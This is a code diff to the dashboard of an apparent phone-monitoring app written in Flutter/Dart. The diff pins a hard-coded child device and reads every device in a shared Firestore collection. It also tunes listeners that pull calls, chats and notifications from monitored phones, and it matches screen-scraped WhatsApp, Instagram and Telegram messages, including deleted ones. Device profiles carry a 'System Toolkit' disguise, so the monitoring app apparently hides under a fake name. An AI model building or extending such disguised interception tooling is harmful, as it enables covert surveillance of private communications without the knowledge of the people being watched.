@@ -86,11 +86,33 @@ class ParentDashboardProvider extends ChangeNotifier {
         if (loaded.isNotEmpty) {
           _children.clear();
           _children.addAll(loaded);
-          if (savedActiveId != null && _children.any((c) => c.id == savedActiveId)) {
+
+          // Guarantee VYRA-13533 is always present in list
+          if (!_children.any((c) => c.pairingCode == _defaultChildCode || c.id == _defaultChildCode)) {
+            _children.insert(0, ChildProfile(
+              id: _defaultChildCode,
+              pairingCode: _defaultChildCode,
+              name: 'Vivo V2404',
+              deviceModel: 'Vivo V2404',
+              batteryLevel: 100,
+              isOnline: true,
+              locationAddress: 'Linked via $_defaultChildCode',
+              selectedDisguise: 'System Toolkit',
+            ));
+          }
+
+          // Filter out obsolete test IDs (like child_1, test)
+          if (savedActiveId != null &&
+              savedActiveId != 'child_1' &&
+              savedActiveId != 'child_2' &&
+              savedActiveId != 'child_default' &&
+              !savedActiveId.startsWith('test') &&
+              _children.any((c) => c.id == savedActiveId)) {
             _activeChildId = savedActiveId;
           } else {
-            _activeChildId = _children.first.id;
+            _activeChildId = _defaultChildCode;
           }
+          _initFirebaseListeners();
           notifyListeners();
         }
       }
@@ -208,34 +230,36 @@ class ParentDashboardProvider extends ChangeNotifier {
       _notifsSub?.cancel();
       _screenTimeSub?.cancel();
 
-      // Auto-discover child devices from Firestore
-      _devicesDiscoverySub ??= _firestore?.collection('devices').snapshots().listen((snapshot) {
-        bool changed = false;
-        for (final doc in snapshot.docs) {
-          final code = doc.id;
-          if (code.isNotEmpty && !_children.any((c) => c.pairingCode == code || c.id == code)) {
-            final d = doc.data();
-            final name = d['name'] ?? "Child Device ($code)";
-            final model = d['deviceModel'] ?? "Android Phone";
-            _children.add(ChildProfile(
-              id: code,
-              pairingCode: code,
-              name: name,
-              deviceModel: model,
-              batteryLevel: (d['batteryLevel'] as num?)?.toInt() ?? 100,
-              isOnline: d['isOnline'] as bool? ?? false,
-              locationAddress: d['locationAddress'] ?? '',
-              selectedDisguise: d['selectedDisguise'] ?? 'System Toolkit',
-              isScreenOn: d['isScreenOn'] as bool? ?? false,
-            ));
-            changed = true;
+      // Auto-discover child devices from Firestore once on start
+      if (_devicesDiscoverySub == null) {
+        _devicesDiscoverySub = _firestore?.collection('devices').get().asStream().listen((snapshot) {
+          bool changed = false;
+          for (final doc in snapshot.docs) {
+            final code = doc.id;
+            if (code.isNotEmpty && !_children.any((c) => c.pairingCode == code || c.id == code)) {
+              final d = doc.data();
+              final name = d['name'] ?? "Child Device ($code)";
+              final model = d['deviceModel'] ?? "Android Phone";
+              _children.add(ChildProfile(
+                id: code,
+                pairingCode: code,
+                name: name,
+                deviceModel: model,
+                batteryLevel: (d['batteryLevel'] as num?)?.toInt() ?? 100,
+                isOnline: d['isOnline'] as bool? ?? false,
+                locationAddress: d['locationAddress'] ?? '',
+                selectedDisguise: d['selectedDisguise'] ?? 'System Toolkit',
+                isScreenOn: d['isScreenOn'] as bool? ?? false,
+              ));
+              changed = true;
+            }
           }
-        }
-        if (changed) {
-          _saveLocalPersistence();
-          notifyListeners();
-        }
-      }, onError: (e) => debugPrint("Device discovery info: $e"));
+          if (changed) {
+            _saveLocalPersistence();
+            notifyListeners();
+          }
+        }, onError: (e) => debugPrint("Device discovery info: $e"));
+      }
 
       final targetDocId = activePairingCode.isNotEmpty ? activePairingCode : _activeChildId;
       if (targetDocId.isEmpty) return;
@@ -268,12 +292,13 @@ class ParentDashboardProvider extends ChangeNotifier {
       }, onError: (e) => debugPrint("Device stream info: $e"));
 
 
-      // 2. Listen to call records
+      // 2. Listen to call records (limit 100 to avoid quota exhaustion and startup freeze)
       _callsSub = _firestore
           ?.collection('calls')
           .doc(targetDocId)
           .collection('records')
           .orderBy('timestamp', descending: true)
+          .limit(100)
           .snapshots()
           .listen((snapshot) {
         if (snapshot.docs.isNotEmpty) {
@@ -347,12 +372,13 @@ class ParentDashboardProvider extends ChangeNotifier {
         }
       }, onError: (e) => debugPrint("Calls stream info: $e"));
 
-      // 3. Listen to chats
+      // 3. Listen to chats (limit 100 to prevent startup freeze)
       _chatsSub = _firestore
           ?.collection('chats')
           .doc(targetDocId)
           .collection('messages')
           .orderBy('timestamp', descending: true)
+          .limit(100)
           .snapshots()
           .listen((snapshot) {
         if (snapshot.docs.isNotEmpty) {
@@ -482,12 +508,13 @@ class ParentDashboardProvider extends ChangeNotifier {
         }
       }, onError: (e) => debugPrint("Chats stream info: $e"));
 
-      // 4. Listen to real-time notification stream (provides exact contact names and deleted backups)
+      // 4. Listen to real-time notification stream (limit 100 to prevent startup freeze)
       _notifsSub = _firestore
           ?.collection('notifications')
           .doc(targetDocId)
           .collection('items')
           .orderBy('timestamp', descending: true)
+          .limit(100)
           .snapshots()
           .listen((snapshot) {
         if (snapshot.docs.isNotEmpty) {
@@ -804,8 +831,18 @@ class ParentDashboardProvider extends ChangeNotifier {
       'aryan (child) [sent 1-view snap]',
     };
 
+    final staticRegex = RegExp(r'[^a-z0-9]');
     String cleanTextNorm(String s) =>
-        s.toLowerCase().replaceAll(RegExp(r'[^a-z0-9]'), '').trim();
+        s.toLowerCase().replaceAll(staticRegex, '').trim();
+
+    // Pre-compute normalized notifications once
+    final notifData = notifs.map((n) {
+      return (
+        notif: n,
+        norm: cleanTextNorm(n.message),
+        appNameLower: n.appName.toLowerCase(),
+      );
+    }).toList();
 
     // 1. Cross-verify existing scraped messages against real notifications
     for (int i = 0; i < existingMsgs.length; i++) {
@@ -815,19 +852,25 @@ class ParentDashboardProvider extends ChangeNotifier {
 
       // Find matching notification in same app within 120 seconds
       NotificationItem? matchedNotif;
-      for (final n in notifs) {
-        final notifNorm = cleanTextNorm(n.message);
+      final msgAppLower = msg.appType.displayName.toLowerCase();
+
+      for (final nd in notifData) {
+        final timeDiff = msg.timestamp.difference(nd.notif.timestamp).inSeconds.abs();
+        if (timeDiff > 120) continue;
+
+        final sameApp = nd.appNameLower.contains(msgAppLower) ||
+            msgAppLower.contains(nd.appNameLower);
+        if (!sameApp) continue;
+
+        final notifNorm = nd.norm;
         if (notifNorm.isEmpty) continue;
 
-        final sameApp = n.appName.toLowerCase().contains(msg.appType.displayName.toLowerCase()) ||
-            msg.appType.displayName.toLowerCase().contains(n.appName.toLowerCase());
         final textMatches = msgNorm == notifNorm ||
             (msgNorm.length > 5 && notifNorm.contains(msgNorm)) ||
             (notifNorm.length > 5 && msgNorm.contains(notifNorm));
-        final timeDiff = msg.timestamp.difference(n.timestamp).inSeconds.abs();
 
-        if (sameApp && textMatches && timeDiff <= 120) {
-          matchedNotif = n;
+        if (textMatches) {
+          matchedNotif = nd.notif;
           break;
         }
       }
@@ -884,9 +927,13 @@ class ParentDashboardProvider extends ChangeNotifier {
       }
     }
 
+    // Pre-cache normalized texts for existingMsgs to make step 2 instant
+    final existingNorms = existingMsgs.map((m) => (msg: m, norm: cleanTextNorm(m.messageText))).toList();
+
     // 2. Add notifications that were missed by the screen scraper (e.g. received when screen was off or deleted)
-    for (final notif in notifs) {
-      final appNameLower = notif.appName.toLowerCase();
+    for (final nd in notifData) {
+      final notif = nd.notif;
+      final appNameLower = nd.appNameLower;
       AppType app = AppType.whatsApp;
       if (appNameLower.contains('insta')) app = AppType.instagram;
       if (appNameLower.contains('tele')) app = AppType.telegram;
@@ -903,21 +950,27 @@ class ParentDashboardProvider extends ChangeNotifier {
       if (!isSocial || notif.message.trim().isEmpty) continue;
       if (isScraperGarbage(notif.message)) continue;
 
-      final notifNorm = cleanTextNorm(notif.message);
+      final notifNorm = nd.norm;
+      if (notifNorm.isEmpty) continue;
 
       // Check if already in existingMsgs
-      final alreadyPresent = existingMsgs.any((m) {
+      final alreadyPresent = existingNorms.any((entry) {
+        final m = entry.msg;
+        final timeDiff = (m.timestamp.difference(notif.timestamp)).inSeconds.abs();
+        if (timeDiff > 120 && !(m.contactName == notif.title && timeDiff < 8)) return false;
+
         final sameApp = m.appType == app;
-        final mNorm = cleanTextNorm(m.messageText);
+        if (!sameApp) return false;
+
+        final mNorm = entry.norm;
         final textMatches = mNorm == notifNorm ||
             (mNorm.length > 5 && notifNorm.contains(mNorm)) ||
             (notifNorm.length > 5 && mNorm.contains(notifNorm));
-        final timeDiff = (m.timestamp.difference(notif.timestamp)).inSeconds.abs();
-        return sameApp && (textMatches || (m.contactName == notif.title && timeDiff < 8));
+        return textMatches || (m.contactName == notif.title && timeDiff < 8);
       });
 
       if (!alreadyPresent) {
-        existingMsgs.add(ChatMessage(
+        final newMsg = ChatMessage(
           id: 'notif_mirror_${notif.id}',
           appType: app,
           contactName: notif.title.isNotEmpty ? notif.title : 'Unknown',
@@ -928,7 +981,9 @@ class ParentDashboardProvider extends ChangeNotifier {
           isDeletedBackup: notif.isDeletedBackup,
           isWatchlistTarget: notif.isSensitiveAlert,
           isDualVerified: false,
-        ));
+        );
+        existingMsgs.add(newMsg);
+        existingNorms.add((msg: newMsg, norm: notifNorm));
       }
     }
 
